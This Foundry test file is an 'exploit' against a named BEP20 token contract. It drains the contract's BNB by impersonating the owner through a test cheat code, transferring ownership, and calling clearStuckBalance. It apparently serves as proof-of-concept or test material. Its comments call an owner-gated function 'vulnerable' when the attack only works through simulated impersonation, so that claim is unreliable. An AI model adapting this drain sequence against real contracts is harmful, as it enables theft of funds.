// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the target contract to allow compilation.
interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function acceptOwnership() external;
    function clearStuckBalance(uint256 amountPercentage) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    BEP20LUNAINU private targetInstance; // Renamed from targetContract to avoid collision with forge-std
    address private originalOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        targetInstance = BEP20LUNAINU(TARGET);
        originalOwner = targetInstance.getOwner();

        // Give the target contract some BNB to have a balance to drain.
        deal(TARGET, 10 ether);

        // Give the attacker some starting funds for gas.
        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Impersonate the original owner to nominate the attacker as the new owner.
                vm.startPrank(originalOwner);
                targetInstance.transferOwnership(attacker); // Removed unnecessary payable cast
                vm.stopPrank();

                // Step 2: As the attacker, accept the ownership nomination.
                // No prank is needed as the attacker is the default caller.
                targetInstance.acceptOwnership();

                // Step 3: Now as the new owner, call the vulnerable function to drain the contract's BNB balance.
                // Prank is not strictly necessary but makes the intent clear that the attacker is the owner.
                vm.prank(attacker);
                targetInstance.clearStuckBalance(100);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
